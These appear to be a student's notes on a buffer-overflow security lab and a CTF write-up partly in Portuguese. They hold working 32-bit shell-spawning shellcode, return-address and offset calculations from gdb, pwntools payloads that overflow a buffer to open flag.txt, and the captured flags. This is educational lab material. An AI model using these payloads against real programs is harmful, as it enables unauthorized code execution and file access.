## Task 1: Getting Familiar with Shellcode
    - 3.4 Task: Invoking the Shellcode´
        - After compiling and running the a32.out and the a64.out, we got a shell with compiled asssembly, one with 32 bits (a32.out) and another with 64 bits (a64.out).

## Task 2: Understanding the Vulnerable Program
    
- Done.

##  Task 3:
    
- 5.1 Investigation
    - Breakpoint 1, bof (str=0xffffce63 "V\004") at stack.c:16
        16	{
    - 20	    strcpy(buffer, str); 
    - p $ebp
        $1 = (void *) 0xffffca38
    - p &buffer
        $2 = (char (*)[100]) 0xffffc9cc

- 5.2 Launching Attacks
    - Changed Lines:
        - shellcode= (
            "\x31\xc0"    # xorl    %eax,eax
            "\x50"        # pushl    %eax
            "\x68""//sh"  # pushl    $0x68732f2f ??
            "\x68""/bin"  # pushl    $0x6e69622f
            "\x89\xe3"    # movl    %esp, %ebx
            "\x50"        # pushl    %eax
            "\x53"        # pushl    %ebx
            "\x89\xe1"    # movl    %esp, %ecx
            "\x31\xd2"    # xorl    %edx, %edx
            "\xb0\x0b"     # movb    $0xb, %al
            "\xcd\x80"    # int    %x80  
        ).encode('latin-1')

        - start = 517 - len(shellcode) 

        - ret    = 0xffffcb58           # $ebp + 120 = 0xffffca38 + 120

        - offset = 112                  # ( ebp - buffer ) + 4 = ( 0xffffca38 - 0xffffc9cc) + 4 = 108 + 4

        - Print : https://drive.google.com/file/d/1vm7OuJtYKEHzJmODLYC7bDOPHTo-N5xa/view?usp=sharing
                  https://drive.google.com/file/d/1XfvfQ-U735ROzjsGV4cWKOzei5ltrPA9/view?usp=sharing 



## CTF5

- Desafio 1
    - Existe algum ficheiro que é aberto e lido pelo programa? 
            Sim, o ficheiro mem.txt

    - Existe alguma forma de controlar o ficheiro que é aberto?
            Sim, o input que vamos dar ao programa tem de ter length=20 e o nome de ficheiro que queremos abrir (enchemos o buffer para conseguir aceder ao outro ficheiro).
            exploit-example.py: r.sendline(b"a"*20+b"flag.txt")

    - Existe algum buffer-overflow? Se sim, o que é que podes fazer?
            Sim, redefinir o ficheiro que abrimos usando o buffer-overflow.

    - flag: flag{bcf1850c9563238472818d22b123145d}


- Desafio 2
    - Que alterações foram feitas?
            Foi adicionada uma variável, val[4] e, para entrar no if, onde podemos depois redefinir o ficheiro a abrir, temos que conseguir colocar no buffer o pointer para val. 


    - Mitigam na totalidade o problema? 
            Não, conseguimos na mesma passar o valor de val e abrir o ficheiro que queremos.


    - É possivel ultrapassar a mitigação usando uma técnica similar à que foi utilizada anteriormente? 
            Sim, mas agora temos de passar também o endereço em little endian (0xfefc2122 -> 0x2221fcfe) do val e depois flag.txt.
            exploit-example.py: r.sendline(b"a"*20+b"\x22\x21\xfc\xfeflag.txt")

    - flag: flag{a6a1597472871fbb819698ee6e025c98}

    
